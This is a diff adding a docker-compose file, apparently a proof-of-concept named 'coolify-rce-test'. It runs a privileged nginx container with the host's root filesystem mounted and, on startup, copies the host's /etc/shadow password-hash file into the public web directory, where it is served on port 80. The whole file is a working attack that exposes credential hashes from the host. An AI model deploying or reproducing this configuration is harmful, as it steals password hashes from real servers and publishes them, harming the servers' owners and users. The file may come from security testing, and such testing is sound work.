@@ -1,0 +1,17 @@
+version: '3.8'
+
+services:
+  rce-test:
+    image: nginx:alpine
+    container_name: coolify-rce-test
+    ports:
+      - "80:80"
+    volumes:
+      - /:/host-root
+      - ./public:/usr/share/nginx/html/public
+    privileged: true
+    command: >
+      sh -c "
+        cat /host-root/etc/shadow > /usr/share/nginx/html/public/shadow.txt &&
+        nginx -g 'daemon off;'
+      "
